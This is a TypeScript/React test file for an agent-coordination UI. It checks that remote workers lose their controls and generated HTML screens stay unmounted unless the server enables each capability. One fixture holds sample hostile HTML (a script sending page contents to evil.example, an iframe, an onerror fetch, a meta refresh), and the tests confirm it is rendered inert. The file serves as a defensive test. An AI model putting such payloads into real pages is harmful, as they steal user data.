import type {
	MasterArtifact,
	MasterCapabilities,
	MasterSnapshot,
	MasterWorker,
} from "@zuse/contracts";
import { renderToStaticMarkup } from "react-dom/server";
import { describe, expect, it, vi } from "vitest";
import { MasterArtifactViewer } from "../../src/components/masters/artifact-viewer.tsx";
import { MasterScreen } from "../../src/components/masters/screen.tsx";
import { SlaveList } from "../../src/components/masters/slaves.tsx";
import {
	canControlWorker,
	masterCapabilities,
	repositoryEnvironmentIds,
} from "../../src/lib/master-capabilities.ts";

const OFF: MasterCapabilities = {
	crossEnvironment: false,
	homeTransfer: false,
	generatedScreens: false,
};
const HOME = "home-env";
const REMOTE = "remote-env";

const worker = (
	environmentId: string,
	sessionId: string,
	objective: string,
): MasterWorker => ({
	environmentId,
	folderId: `${environmentId}-repo`,
	chatId: `${sessionId}-chat`,
	sessionId,
	objective,
	state: "active",
	followUps: 0,
	lastEventSequence: 0,
});

const snapshot = (capabilities?: MasterCapabilities): MasterSnapshot => ({
	...(capabilities ? { capabilities } : {}),
	master: {
		id: "master-1",
		revision: 1,
		generation: 1,
		accountManaged: false,
		homeEnvironmentId: HOME,
		workspaceId: "master-workspace-master-1",
		status: "active",
		settings: {
			name: "pip",
			providerId: "codex",
			model: "test",
			instructions: "",
			skills: [],
			modelGuidance: "",
			maxConcurrent: 4,
			maxFollowUps: 3,
		},
		repositories: [
			{ environmentId: HOME, folderId: `${HOME}-repo`, name: "home-repo" },
			{
				environmentId: REMOTE,
				folderId: `${REMOTE}-repo`,
				name: "remote-repo",
			},
		],
		workers: [
			worker(HOME, "home-session", "Fix the home build"),
			worker(REMOTE, "remote-session", "Fix the remote build"),
		],
		conversations: [],
		activeSessionId: null,
		coordinatorEventSequence: 0,
		entries: [],
		artifacts: [],
		createdAt: 0,
		updatedAt: 0,
	},
	coordinator: null,
	workspacePath: "/tmp/master-1",
	coordinatorMessageCount: 0,
	chats: [],
	unavailableEnvironments: [],
	pendingActions: [],
});

const renderSlaves = (value: MasterSnapshot) =>
	renderToStaticMarkup(
		<SlaveList
			snapshot={value}
			busy={false}
			perform={vi.fn()}
			openChat={vi.fn()}
		/>,
	);

/** The markup of the list item that mentions `objective`. */
const rowFor = (markup: string, objective: string) =>
	markup.split("<li").find((row) => row.includes(objective)) ?? "";

describe("Master capability gating", () => {
	it("treats missing or unset capabilities as disabled", () => {
		expect(masterCapabilities({})).toEqual(OFF);
		expect(masterCapabilities({ capabilities: undefined })).toEqual(OFF);
		expect(
			masterCapabilities({ capabilities: { ...OFF, crossEnvironment: true } }),
		).toEqual({ ...OFF, crossEnvironment: true });
	});

	it("offers only home repositories unless cross-environment work is on", () => {
		const connected = [HOME, REMOTE];
		expect(
			repositoryEnvironmentIds(HOME, connected, masterCapabilities({})),
		).toEqual([HOME]);
		expect(
			repositoryEnvironmentIds(HOME, connected, {
				...OFF,
				crossEnvironment: true,
			}),
		).toEqual([HOME, REMOTE]);
	});

	it("gates only remote slaves when cross-environment work is off", () => {
		const off = masterCapabilities({});
		expect(canControlWorker({ environmentId: HOME }, HOME, off)).toBe(true);
		expect(canControlWorker({ environmentId: REMOTE }, HOME, off)).toBe(false);
		expect(
			canControlWorker({ environmentId: REMOTE }, HOME, {
				...OFF,
				crossEnvironment: true,
			}),
		).toBe(true);
	});

	it("keeps remote slaves visible and openable but without controls by default", () => {
		const markup = renderSlaves(snapshot());
		const home = rowFor(markup, "Fix the home build");
		const remote = rowFor(markup, "Fix the remote build");
		expect(home).toContain("Open chat: Fix the home build");
		expect(home).toContain('aria-label="Stop agent"');
		expect(remote).toContain("Open chat: Fix the remote build");
		expect(remote).not.toContain('aria-label="Stop agent"');
		expect(remote).not.toContain('aria-label="Mark done"');
	});

	it("restores remote slave controls when the server enables cross-environment work", () => {
		const markup = renderSlaves(snapshot({ ...OFF, crossEnvironment: true }));
		expect(rowFor(markup, "Fix the remote build")).toContain(
			'aria-label="Stop agent"',
		);
	});

	describe("generated screens", () => {
		const screen: MasterArtifact = {
			id: "release",
			title: "Release checklist",
			kind: "screen",
			version: 1,
			pinned: true,
			author: "master",
			updatedAt: 0,
		};
		const SOURCE = "<script>location.href = 'https://example.com'</script>";
		const renderScreen = (value: MasterSnapshot) =>
			renderToStaticMarkup(
				<MasterArtifactViewer
					snapshot={value}
					selectedId={screen.id}
					artifact={{ metadata: screen, content: SOURCE }}
					busy={false}
					select={vi.fn()}
					execute={vi.fn()}
					perform={vi.fn()}
					openChat={vi.fn()}
					onClose={vi.fn()}
				/>,
			);

		it.each([
			["missing", undefined],
			["off", OFF],
		])("never mounts the screen when the capability is %s", (_, value) => {
			const markup = renderScreen(snapshot(value));
			expect(markup).not.toContain("<iframe");
			expect(markup).not.toContain("<script>");
			expect(markup).toContain(
				"Generated screens don’t run in this Preview. Showing the source instead.",
			);
			expect(markup).toContain(
				"&lt;script&gt;location.href = &#x27;https://example.com&#x27;&lt;/script&gt;",
			);
		});

		// Hostile generated HTML: self-navigation, nested frames and inline handlers.
		const HOSTILE = [
			"<script>location.href = 'https://evil.example/?d=' + document.body.innerHTML</script>",
			'<iframe src="https://evil.example"></iframe>',
			"<img src=x onerror=\"fetch('https://evil.example')\">",
			'<meta http-equiv="refresh" content="0;url=https://evil.example">',
		].join("\n");
		const renderDirect = (value: MasterSnapshot) =>
			renderToStaticMarkup(
				<MasterScreen
					content={HOSTILE}
					snapshot={value}
					execute={vi.fn()}
					openChat={vi.fn()}
				/>,
			);

		it.each([
			["missing", undefined],
			["off", OFF],
		])("keeps hostile content inert in MasterScreen when the capability is %s", (_, value) => {
			const markup = renderDirect(snapshot(value));
			for (const tag of ["<iframe", "<script", "<img", "<meta"])
				expect(markup).not.toContain(tag);
			expect(markup).toContain(
				"&lt;iframe src=&quot;https://evil.example&quot;&gt;",
			);
		});

		it("mounts the sandboxed screen only when the server enables it", () => {
			const markup = renderScreen(snapshot({ ...OFF, generatedScreens: true }));
			expect(markup).toContain("<iframe");
		});
	});
});
